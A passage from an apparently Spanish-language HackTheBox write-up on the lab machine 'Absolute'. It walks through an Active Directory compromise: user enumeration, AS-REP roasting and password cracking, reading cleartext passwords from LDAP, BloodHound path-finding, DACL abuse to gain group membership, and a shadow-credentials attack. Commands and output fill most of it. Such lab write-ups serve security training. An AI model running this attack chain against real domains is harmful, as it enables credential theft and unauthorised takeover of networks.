Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 <span class="o">(</span>1 1<span class="o">)</span>
Image Size                      : 1900x1150
Megapixels                      : 2.2
</code></pre></div></div>

<ul>
  <li>Como vemos un nombre de usuario los mas probable es que los dem√°s usuarios tambi√©n tengan un nombre de usuario en cada foto as√≠ que vamos a filtrar por ese campo para ver los nombres.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content exiftool hero_<span class="k">*</span>.jpg <span class="nt">-Author</span>
<span class="o">========</span> hero_1.jpg
Author                          : James Roberts
<span class="o">========</span> hero_2.jpg
Author                          : Michael Chaffrey
<span class="o">========</span> hero_3.jpg
Author                          : Donald Klay
<span class="o">========</span> hero_4.jpg
Author                          : Sarah Osvald
<span class="o">========</span> hero_5.jpg
Author                          : Jeffer Robinson
<span class="o">========</span> hero_6.jpg
Author                          : Nicole Smith
    6 image files <span class="nb">read</span>
</code></pre></div></div>

<ul>
  <li>Vamos hacer una lista con la estructura de los nombres de un Active Directory primero la letra may√∫scula y despu√©s su nombre.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="nb">cat </span>users.txt
J.Roberts
M.Chaffrey
D.Klay
S.Osvald
J.Robinson
N.Smith
</code></pre></div></div>

<ul>
  <li>Teniendo esta lista potencial de usuarios vamos a ver si son validos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content /opt/kerbrute_linux_amd64 userenum <span class="nt">--dc</span> dc.absolute.htb <span class="nt">-d</span> absolute.htb users.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ <span class="se">\/</span> ___/ __ <span class="se">\/</span> ___/ / / / __/ _ <span class="se">\</span>
 / ,&lt; /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|<span class="se">\_</span>__/_/  /_.___/_/   <span class="se">\_</span>_,_/<span class="se">\_</span>_/<span class="se">\_</span>__/

Version: v1.0.3 <span class="o">(</span>9dad6e1<span class="o">)</span> - 06/18/24 - Ronnie Flathers @ropnop

2024/06/18 12:56:17 <span class="o">&gt;</span>  Using KDC<span class="o">(</span>s<span class="o">)</span>:
2024/06/18 12:56:17 <span class="o">&gt;</span>  	dc.absolute.htb:88

2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 M.Chaffrey@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 S.Osvald@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 J.Roberts@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 N.Smith@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 J.Robinson@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  <span class="o">[</span>+] VALID USERNAME:	 D.Klay@absolute.htb
2024/06/18 12:56:17 <span class="o">&gt;</span>  Done! Tested 6 usernames <span class="o">(</span>6 valid<span class="o">)</span> <span class="k">in </span>0.331 seconds
</code></pre></div></div>

<ul>
  <li>Ahora que sabemos que los usuario son validos podemos probar un <code class="language-plaintext highlighter-rouge">ASREPRoast Attack</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content impacket-GetNPUsers absolute.htb/ <span class="nt">-no-pass</span> <span class="nt">-usersfile</span> users.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] User J.Roberts doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Chaffrey doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="nv">$krb5asrep$23$D</span>.Klay@ABSOLUTE.HTB:90b6ffe0ec2f136b9268b7bc5ea29f46<span class="nv">$f2f0909c2a88da7f818720581aaf8143b646f285fb93489bf228d37acfb190c7d777ce0b22a5e61a7e9f6b293037e0f90899db4de678920773547c032cbd26dd22f9008e75a75b8ce4902959778bb52344bd76e61bfb406e575105b4d2e62130261f43b535333dddaa1587116edaac1babeb69b3e85f45797513a2f5852b97995127fced566cd2a65d8358fa894c5dae47938dd083c99c21c28055ff83ffa743e66a899ceb26a6fa1edac18796ddb7f26791309cfb6a812e6e0dbbc76ce8abddb9ed9929aa8c351e3db6932389544a85c0cb06c375de560737b51872ed9810f2131fbd785f979d7eb2d0054b</span>
<span class="o">[</span>-] User S.Osvald doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
[-] User J.Robinson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH <span class="nb">set</span>
<span class="o">[</span>-] User N.Smith doesn<span class="s1">'t have UF_DONT_REQUIRE_PREAUTH set
</span></code></pre></div></div>

<ul>
  <li>Tenemos el hash de <code class="language-plaintext highlighter-rouge">D.Klay</code> vamos a crackearlo para ver su contrase√±a.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x]<span class="o">)</span>
Will run 2 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Darkmoonsky248girl <span class="o">(</span><span class="nv">$krb5asrep$23$D</span>.Klay@ABSOLUTE.HTB<span class="o">)</span>
1g 0:00:00:24 DONE <span class="o">(</span>2024-06-18 13:00<span class="o">)</span> 0.04149g/s 466323p/s 466323c/s 466323C/s DarrenCahppell..Danuelle
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</code></pre></div></div>

<ul>
  <li>Tenemos credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="nb">echo</span> <span class="s2">"D.Klay:Darkmoonsky248girl"</span> | <span class="nb">sudo tee </span>creds.txt
D.Klay:Darkmoonsky248girl
</code></pre></div></div>

<ul>
  <li>Vamos a sincronizarnos al reloj del dominio.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="nb">sudo </span>ntpdate <span class="nt">-s</span> absolute.htb
</code></pre></div></div>

<ul>
  <li>Sin embargo las credenciales nos devuelven un <code class="language-plaintext highlighter-rouge">STATUS_ACCOUNT_RESTRICTION</code> <a href="https://blog.whiteflag.io/blog/protected-users-you-thought-you-were-safe/">https://blog.whiteflag.io/blog/protected-users-you-thought-you-were-safe/</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION
</code></pre></div></div>

<ul>
  <li>Si nos autenticamos con el protocolo de <code class="language-plaintext highlighter-rouge">kerberos</code> nos dicen que si son correctas.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/3.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content cme smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
</code></pre></div></div>

<h2 id="svc_smb">svc_smb</h2>

<ul>
  <li>Como por <code class="language-plaintext highlighter-rouge">kerberos</code> las credenciales son correctas podemos enumerar por el protocolo <code class="language-plaintext highlighter-rouge">smb</code> recursos compartidos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span> <span class="nt">--shares</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.181    445    DC               Share           Permissions     Remark
SMB         10.10.11.181    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.181    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.181    445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.10.11.181    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.181    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.181    445    DC               Shared
SMB         10.10.11.181    445    DC               SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Bueno no hay nada interesante algo que podemos hacer es usar el protocolo <code class="language-plaintext highlighter-rouge">ldap</code> para enumerar usuarios del dominio mediante al autenticaci√≥n de <code class="language-plaintext highlighter-rouge">kerberos</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content crackmapexec ldap 10.10.11.181 <span class="nt">-u</span> <span class="s1">'D.Klay'</span> <span class="nt">-p</span> <span class="s1">'Darkmoonsky248girl'</span> <span class="nt">-k</span> <span class="nt">--users</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
LDAP        10.10.11.181    389    DC               <span class="o">[</span>+] absolute.htb<span class="se">\D</span>.Klay:Darkmoonsky248girl
LDAP        10.10.11.181    389    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Total of records returned 20
LDAP        10.10.11.181    389    DC               Administrator                  Built-in account <span class="k">for </span>administering the computer/domain
LDAP        10.10.11.181    389    DC               Guest                          Built-in account <span class="k">for </span>guest access to the computer/domain
LDAP        10.10.11.181    389    DC               krbtgt                         Key Distribution Center Service Account
LDAP        10.10.11.181    389    DC               J.Roberts
LDAP        10.10.11.181    389    DC               M.Chaffrey
LDAP        10.10.11.181    389    DC               D.Klay
LDAP        10.10.11.181    389    DC               s.osvald
LDAP        10.10.11.181    389    DC               j.robinson
LDAP        10.10.11.181    389    DC               n.smith
LDAP        10.10.11.181    389    DC               m.lovegod
LDAP        10.10.11.181    389    DC               l.moore
LDAP        10.10.11.181    389    DC               c.colt
LDAP        10.10.11.181    389    DC               s.johnson
LDAP        10.10.11.181    389    DC               d.lemm
LDAP        10.10.11.181    389    DC               svc_smb                        AbsoluteSMBService123!
LDAP        10.10.11.181    389    DC               svc_audit
LDAP        10.10.11.181    389    DC               winrm_user                     Used to perform simple network tasks
</code></pre></div></div>

<ul>
  <li>Tenemos nuevas credenciales.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>D.Klay:Darkmoonsky248girl
svc_smb:AbsoluteSMBService123!
</code></pre></div></div>

<ul>
  <li>Si las revisamos vemos que son correctas usando el protocolo de <code class="language-plaintext highlighter-rouge">kerberos</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'svc_smb'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteSMBService123!'</span> <span class="nt">-k</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\s</span>vc_smb:AbsoluteSMBService123!
</code></pre></div></div>

<h2 id="mlovegod">m.lovegod</h2>

<ul>
  <li>Podemos volver a listar recursos compartidos por el protocol√≥ <code class="language-plaintext highlighter-rouge">smb</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'svc_smb'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteSMBService123!'</span> <span class="nt">-k</span> <span class="nt">--shares</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\s</span>vc_smb:AbsoluteSMBService123!
SMB         10.10.11.181    445    DC               <span class="o">[</span>+] Enumerated shares
SMB         10.10.11.181    445    DC               Share           Permissions     Remark
SMB         10.10.11.181    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
SMB         10.10.11.181    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
SMB         10.10.11.181    445    DC               C<span class="nv">$ </span>                             Default share
SMB         10.10.11.181    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
SMB         10.10.11.181    445    DC               NETLOGON        READ            Logon server share
SMB         10.10.11.181    445    DC               Shared          READ
SMB         10.10.11.181    445    DC               SYSVOL          READ            Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a conectarnos para ver que hay dentro de <code class="language-plaintext highlighter-rouge">shared</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content impacket-smbclient <span class="nt">-k</span> absolute.htb/svc_smb:<span class="s1">'AbsoluteSMBService123!'</span>@dc.absolute.htb
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span>-] CCache file is not found. Skipping...
Type <span class="nb">help </span><span class="k">for </span>list of commands
<span class="c"># use Shared</span>
<span class="c"># ls</span>
drw-rw-rw-          0  Thu Sep  1 12:02:23 2022 <span class="nb">.</span>
drw-rw-rw-          0  Thu Sep  1 12:02:23 2022 ..
<span class="nt">-rw-rw-rw-</span>         72  Thu Sep  1 12:02:23 2022 compiler.sh
<span class="nt">-rw-rw-rw-</span>      67584  Thu Sep  1 12:02:23 2022 test.exe
</code></pre></div></div>

<ul>
  <li>Vamos a descargar los 2 archivos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># mget *</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading compiler.sh
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Downloading test.exe
</code></pre></div></div>

<ul>
  <li>Tenemos un ejecutable y un script en <code class="language-plaintext highlighter-rouge">bash</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content file test.exe
test.exe: PE32+ executable <span class="o">(</span>GUI<span class="o">)</span> x86-64 <span class="o">(</span>stripped to external PDB<span class="o">)</span>, <span class="k">for </span>MS Windows, 11 sections
‚ûú  content <span class="nb">cat </span>compiler.sh
<span class="c">#!/bin/bash</span>

nim c <span class="nt">-d</span>:mingw <span class="nt">--app</span>:gui <span class="nt">--cc</span>:gcc <span class="nt">-d</span>:danger <span class="nt">-d</span>:strip <span class="nv">$1</span>
</code></pre></div></div>

<ul>
  <li>Vamos agregar al <code class="language-plaintext highlighter-rouge">/etc/hosts</code> la <code class="language-plaintext highlighter-rouge">IP</code> y dominios de la m√°quina victima.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/hosts.png" />
</p>

<ul>
  <li>Vamos correr la <code class="language-plaintext highlighter-rouge">VPN</code> de <code class="language-plaintext highlighter-rouge">HackTheBox</code> en la m√°quina <code class="language-plaintext highlighter-rouge">Windows</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/vpn.png" />
</p>

<ul>
  <li>
    <p>Ahora vamos a pasar el <code class="language-plaintext highlighter-rouge">.exe</code> a la m√°quina Windows.</p>
  </li>
  <li>
    <p>Como no sabemos que hace el <strong>.exe</strong> vamos a ponernos a interceptar el trafico con <code class="language-plaintext highlighter-rouge">Wireshark</code>.</p>
  </li>
  <li>
    <p>Al momento de ejecutar el binario y estar capturando con <code class="language-plaintext highlighter-rouge">Wireshark</code> encontramos credenciales.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/creds.png" />
</p>

<ul>
  <li>Nos dice que no son correctas.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content crackmapexec smb 10.10.11.181 <span class="nt">-u</span> <span class="s1">'mlovegod'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteLDAP2022!'</span> <span class="nt">-k</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         10.10.11.181    445    DC               <span class="o">[</span>-] absolute.htb<span class="se">\m</span>lovegod: KDC_ERR_C_PRINCIPAL_UNKNOWN
</code></pre></div></div>

<ul>
  <li>Si les ponemos un punto funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content crackmapexec smb absolute.htb <span class="nt">-u</span> <span class="s1">'m.lovegod'</span> <span class="nt">-p</span> <span class="s1">'AbsoluteLDAP2022!'</span> <span class="nt">-k</span>
SMB         absolute.htb    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 / Server 2019 Build 17763 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:absolute.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         absolute.htb    445    DC               <span class="o">[</span>+] absolute.htb<span class="se">\m</span>.lovegod:AbsoluteLDAP2022!
</code></pre></div></div>

<ul>
  <li>Para enumerar el <code class="language-plaintext highlighter-rouge">DC</code> vamos a usar <code class="language-plaintext highlighter-rouge">bloodhound</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content bloodhound-python <span class="nt">-u</span> m.lovegod <span class="nt">-p</span> AbsoluteLDAP2022! <span class="nt">-k</span> <span class="nt">-c</span> All <span class="nt">-d</span> absolute.htb <span class="nt">-dc</span> dc.absolute.htb <span class="nt">-ns</span> 10.10.11.181 <span class="nt">--zip</span>
INFO: Found AD domain: absolute.htb
INFO: Getting TGT <span class="k">for </span>user
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 1 domains
INFO: Found 1 domains <span class="k">in </span>the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.absolute.htb
INFO: Found 18 <span class="nb">users
</span>INFO: Found 55 <span class="nb">groups
</span>INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: dc.absolute.htb
INFO: Done <span class="k">in </span>00M 23S
INFO: Compressing output into 20240618211316_bloodhound.zip
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ <span class="nb">sudo </span>neo4j start
Directories <span class="k">in </span>use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j <span class="o">(</span>pid:39754<span class="o">)</span><span class="nb">.</span> It is available at http://localhost:7474
There may be a short delay <span class="k">until </span>the server is ready.

‚ûú  ~ bloodhound &amp;&gt; /dev/null &amp; <span class="nb">disown</span>
</code></pre></div></div>

<ul>
  <li>Vamos a marcar los usuarios que ya tenemos comprometidos.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/klay.png" />
</p>

<ul>
  <li>Si vamos a <code class="language-plaintext highlighter-rouge">Shortest Paths</code> y seleccionamos el usuario <code class="language-plaintext highlighter-rouge">m.lovegod</code> encontramos una forma de convertirnos en el usuario <code class="language-plaintext highlighter-rouge">winrm_user</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/4.png" />
</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">m.lovegod</code> tiene el privilegio <code class="language-plaintext highlighter-rouge">owns</code> en el grupo <code class="language-plaintext highlighter-rouge">GenericWrite</code>.</li>
</ul>

<blockquote>
  <p>El privilegio ‚ÄúOwns‚Äù dentro del grupo ‚ÄúGenericWrite‚Äù le otorga al usuario la capacidad de modificar la mayor√≠a de los atributos del objeto, administrar el objeto y delegar permisos a otros usuarios, con ciertas excepciones.</p>
</blockquote>

<ul>
  <li>El usuario el cual es nuestro objetivo es parte del grupo <code class="language-plaintext highlighter-rouge">Remote Management Users</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/5.png" />
</p>

<h2 id="mlovegod-to-network-audit">m.lovegod to Network Audit</h2>

<ul>
  <li>Estuve muchas horas tratando de solucionar los errores para empezar tuve que hacer los mismos pasos 3 veces para llegar a obtener el hash NT de <strong>winrm_user</strong> pero esto fue lo que hice.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="nb">cat</span> /etc/resolv.conf
<span class="c"># Generated by NetworkManager</span>
nameserver 10.10.11.181
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content <span class="nb">cat</span> /usr/share/samba/setup/krb5.conf
<span class="o">[</span>libdefaults]
	default_realm <span class="o">=</span> ABSOLUTE.HTB
	dns_lookup_realm <span class="o">=</span> <span class="nb">false
	</span>dns_lookup_kdc <span class="o">=</span> <span class="nb">true</span>

<span class="o">[</span>realms]
<span class="k">${</span><span class="nv">REALM</span><span class="k">}</span> <span class="o">=</span> ABSOLUTE.HTB <span class="o">=</span> <span class="o">{</span>
		kdc <span class="o">=</span> dc.absolute.htb
		admin_server <span class="o">=</span> dc.absolute.htb
		default_domain <span class="o">=</span> absolute.htb
	  <span class="o">}</span>

<span class="o">[</span>domain_realm]
	<span class="k">${</span><span class="nv">HOSTNAME</span><span class="k">}</span> <span class="o">=</span> <span class="k">${</span><span class="nv">REALM</span><span class="k">}</span>
</code></pre></div></div>

<ul>
  <li>
    <p>En <code class="language-plaintext highlighter-rouge">bloodhound</code> nos dicen que podemos usar <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1s">https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1s</a> para agregar al usuario.</p>
  </li>
  <li>
    <p>Tambi√©n podemos hacerlo desde nuestra m√°quina Linux con los pasos que nos dicen en bloodhound.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/insane/absolute/f.png" />
</p>

<ul>
  <li>
    <p><a href="https://github.com/fortra/impacket/blob/d71f4662eaf12c006c2ea7f5ec09b418d9495806/examples/owneredit.py">https://github.com/fortra/impacket/blob/d71f4662eaf12c006c2ea7f5ec09b418d9495806/examples/owneredit.py</a></p>
  </li>
  <li>
    <p><a href="https://github.com/ShutdownRepo/impacket.git">https://github.com/ShutdownRepo/impacket.git</a>.</p>
  </li>
  <li>
    <p>Ahora obtendremos control total del grupo Network Audit para el usuario m.lovegod.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content python3 dacledit.py <span class="nt">-k</span> <span class="nt">-no-pass</span> absolute.htb/m.lovegod <span class="nt">-dc-ip</span> dc.absolute.htb <span class="nt">-principal</span> m.lovegod <span class="nt">-target</span> <span class="s2">"Network Audit"</span> <span class="nt">-action</span> write <span class="nt">-rights</span> FullControl
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> DACL backed up to dacledit-20240619-000424.bak
<span class="o">[</span><span class="k">*</span><span class="o">]</span> DACL modified successfully!
</code></pre></div></div>

<ul>
  <li>Ahora agregamos el usuario.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content net rpc group addmem <span class="s2">"Network Audit"</span> m.lovegod <span class="nt">-U</span> <span class="s1">'absolute.htb/m.lovegod%AbsoluteLDAP2022!'</span> <span class="nt">-S</span> dc.absolute.htb <span class="nt">--use-kerberos</span><span class="o">=</span>required
</code></pre></div></div>

<ul>
  <li>Comprobamos que el usuario esta en el grupo.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content net rpc group members <span class="s2">"Network Audit"</span> <span class="nt">-U</span> <span class="s1">'absolute.htb/m.lovegod%AbsoluteLDAP2022!'</span> <span class="nt">-S</span> dc.absolute.htb <span class="nt">--use-kerberos</span><span class="o">=</span>required
absolute<span class="se">\m</span>.lovegod
absolute<span class="se">\s</span>vc_audit
</code></pre></div></div>

<ul>
  <li>Ahora vamos a generar un TGT y lo exportamos como variable para despu√©s autenticarnos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content impacket-getTGT absolute.htb/m.lovegod:AbsoluteLDAP2022!
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Saving ticket <span class="k">in </span>m.lovegod.ccache
‚ûú  content <span class="nb">export </span><span class="nv">KRB5CCNAME</span><span class="o">=</span>m.lovegod.ccache
</code></pre></div></div>

<ul>
  <li>En este punto deber√≠amos de tener <code class="language-plaintext highlighter-rouge">GenericWrite</code> en el usuario <code class="language-plaintext highlighter-rouge">winrm_user</code> podemos usar <code class="language-plaintext highlighter-rouge">certipy</code> para obtener el <code class="language-plaintext highlighter-rouge">TGT</code> del usuario <a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  content certipy-ad shadow auto <span class="nt">-u</span> absolute.htb/m.lovegod@dc.absolute.htb <span class="nt">-k</span> <span class="nt">-no-pass</span> <span class="nt">-target</span> dc.absolute.htb <span class="nt">-account</span> winrm_user
Certipy v4.8.2 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Targeting user <span class="s1">'winrm_user'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating certificate
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Certificate generated
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Generating Key Credential
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Key Credential generated with DeviceID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Adding Key Credential with device ID <span class="s1">'57b7f097-a9b3-ed02-6197-427cafe8b77b'</span> to the Key Credentials <span class="k">for</span> <span class="s1">'winrm_user'</span>
